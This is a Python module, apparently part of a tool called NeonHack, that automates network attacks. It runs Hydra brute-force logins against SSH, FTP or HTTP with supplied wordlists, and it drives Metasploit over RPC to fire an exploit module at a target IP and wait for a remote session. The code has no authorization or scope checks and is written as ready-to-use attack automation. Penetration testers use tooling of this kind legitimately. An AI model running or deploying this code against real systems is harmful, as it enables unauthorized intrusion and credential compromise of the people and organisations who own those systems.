"""
Refactored Scanner Tools Library for NeonHack (v5.0 - Hardened)

This module contains all non-privileged scanning and attack logic.
It provides secure wrappers for command-line tools and external services.
"""
import logging
import subprocess
import tempfile
import os
import socket
import json
from pymetasploit3.msfrpc import MsfRpcClient

logging.basicConfig(level=logging.INFO, format='%(asctime)s [%(levelname)s] - %(message)s')

def secure_delete(filepath):
    """Securely deletes a file by overwriting its content first."""
    if filepath and os.path.exists(filepath):
        try:
            with open(filepath, "ba+") as f:
                length = f.tell()
                f.seek(0)
                f.write(os.urandom(length))
            os.remove(filepath)
        except Exception as e:
            logging.error(f"Failed to securely delete temp file {filepath}: {e}")

def test_connectivity(ip: str, protocol: str, retries=2):
    """Performs a simple TCP connection test with retry mechanism."""
    PORT_MAP = {'ssh': 22, 'ftp': 21, 'http': 80}
    port = PORT_MAP.get(protocol.lower())
    if not port:
        return {"status": "error", "message": f"Unsupported protocol: {protocol}"}
    
    for attempt in range(retries + 1):
        try:
            logging.info(f"Testing connectivity to {ip}:{port} ({protocol}) - Attempt {attempt + 1}")
            with socket.create_connection((ip, port), timeout=5) as s:
                logging.info(f"✅ Successfully connected to {ip}:{port} ({protocol})")
                return {"status": "success", "message": f"Connected to {ip} on port {port} ({protocol})."}
                
        except socket.timeout:
            error_msg = f"Connection to {ip} on port {port} timed out"
            if attempt < retries:
                logging.warning(f"⚠️  {error_msg} - Retrying...")
                continue
            logging.error(f"❌ {error_msg} - All attempts failed")
            return {"status": "error", "message": f"{error_msg}."}
            
        except Exception as e:
            error_msg = f"Failed to connect to {ip} on port {port}: {e}"
            if attempt < retries and ("refused" not in str(e).lower()):
                logging.warning(f"⚠️  {error_msg} - Retrying...")
                continue
            logging.error(f"❌ {error_msg}")
            return {"status": "error", "message": error_msg}

def hydra_attack(ip, protocol, username_wordlist, password_wordlist, timeout=300):
    """Performs a Hydra attack and returns a structured dictionary."""
    user_file_path, pass_file_path = None, None
    try:
        with tempfile.NamedTemporaryFile(mode='w+', delete=False, suffix='.txt') as user_file, \
             tempfile.NamedTemporaryFile(mode='w+', delete=False, suffix='.txt') as pass_file:
            user_file.write(username_wordlist)
            user_file_path = user_file.name
            pass_file.write(password_wordlist)
            pass_file_path = pass_file.name
        
        command = ['hydra', '-L', user_file_path, '-P', pass_file_path, f'{protocol}://{ip}']
        logging.info(f"Executing command with {timeout}s timeout: {' '.join(command)}")
        
        result = subprocess.run(
            command, capture_output=True, text=True, check=False, timeout=timeout
        )
        
        if result.stderr:
            return {"status": "error", "message": f"Hydra Error: {result.stderr}"}
        elif result.stdout:
            return {"status": "success", "data": result.stdout}
        else:
            return {"status": "success", "data": "Hydra ran successfully but found no credentials."}
            
    except FileNotFoundError:
        return {"status": "error", "message": "Error: 'hydra' command not found. Please ensure it is installed."}
    except subprocess.TimeoutExpired:
        return {"status": "error", "message": f"Error: Hydra process timed out after {timeout} seconds."}
    except Exception as e:
        return {"status": "error", "message": f"An unexpected error occurred: {e}"}
    finally:
        secure_delete(user_file_path)
        secure_delete(pass_file_path)

def execute_exploit(ip, module_name, msf_password, timeout=60):
    """Connects to Metasploit RPC and executes a whitelisted module with enhanced logging."""
    logging.info(f"🚀 Starting Metasploit exploit: {module_name} against {ip}")
    
    try:
        # Try to connect to Metasploit RPC
        client = None
        for port in [55553, 55552]:
            try:
                logging.info(f"🔌 Attempting to connect to msfrpcd on port {port}")
                client = MsfRpcClient(msf_password, ssl=False, port=port)
                logging.info(f"✅ Successfully connected to msfrpcd on port {port}")
                break
            except ConnectionRefusedError:
                logging.warning(f"⚠️  Connection refused on port {port}")
                continue
        
        if not client:
            error_msg = "Failed to connect to msfrpcd. Please ensure msfrpcd is running on localhost:55553 or localhost:55552"
            logging.error(f"❌ {error_msg}")
            return {"status": "error", "message": error_msg}
        
        if not client.authenticated:
            error_msg = "Authentication to Metasploit RPC failed. Check MSF_PASSWORD environment variable."
            logging.error(f"❌ {error_msg}")
            return {"status": "error", "message": error_msg}

        logging.info("✅ Successfully authenticated with Metasploit RPC")

        # Parse and load the module
        try:
            module_type, module_path = module_name.split('/', 1)
            logging.info(f"📦 Loading module: {module_type}/{module_path}")
            exploit = client.modules.use(module_type, module_path)
            if not exploit:
                error_msg = f"Failed to load module {module_name}. Module may not exist or be whitelisted."
                logging.error(f"❌ {error_msg}")
                return {"status": "error", "message": error_msg}
            logging.info(f"✅ Module loaded successfully: {exploit.fullname}")
        except ValueError:
            error_msg = f"Invalid module name format: {module_name}. Expected format: type/path"
            logging.error(f"❌ {error_msg}")
            return {"status": "error", "message": error_msg}

        # Configure and execute the module
        exploit['RHOSTS'] = ip
        logging.info(f"🎯 Configured target: {ip}")
        logging.info(f"🚀 Executing module {exploit.fullname} on {ip}...")
        
        try:
            job_info = exploit.execute()
            logging.info(f"✅ Module execution initiated: {job_info}")
        except Exception as e:
            error_msg = f"Failed to execute module: {e}"
            logging.error(f"❌ {error_msg}")
            return {"status": "error", "message": error_msg}

        job_id = job_info.get('job_id')
        if job_id is None:
            error_msg = "Failed to start exploit job"
            logging.error(f"❌ {error_msg}: {job_info}")
            return {"status": "error", "message": error_msg, "details": job_info}
            
        logging.info(f"🔄 Exploit started as job ID: {job_id}. Polling for session...")
        
        # Poll for sessions with better progress tracking
        import time
        poll_interval = max(1, timeout // 60)  # Dynamic polling interval
        polls_completed = 0
        max_polls = timeout // poll_interval
        
        for poll_count in range(max_polls):
            try:
                sessions = client.sessions.list
                for session_id, session_data in sessions.items():
                    if (session_data.get('via_exploit') == exploit.fullname and 
                        session_data.get('session_host') == ip):
                        logging.info(f"🎉 SUCCESS! Session {session_id} opened after {poll_count * poll_interval}s")
                        return {
                            "status": "success", 
                            "session_id": session_id, 
                            "details": session_data,
                            "execution_time": poll_count * poll_interval
                        }
                
                polls_completed += 1
                if polls_completed % 10 == 0:  # Log every 10 polls
                    logging.info(f"🔄 Still polling for sessions... ({polls_completed}/{max_polls})")
                    
                time.sleep(poll_interval)
            except Exception as e:
                logging.warning(f"⚠️  Error while polling for sessions: {e}")
                break
        
        timeout_msg = f"Exploit job started, but no session was created within {timeout} seconds."
        logging.warning(f"⏰ {timeout_msg}")
        return {"status": "timeout", "message": timeout_msg, "job_id": job_id}
        
    except ImportError:
        error_msg = "pymetasploit3 library not available. Please install it with: pip install pymetasploit3"
        logging.error(f"❌ {error_msg}")
        return {"status": "error", "message": error_msg}
    except Exception as e:
        error_msg = f"Unexpected error during exploit execution: {e}"
        logging.error(f"❌ {error_msg}")
        return {"status": "error", "message": error_msg}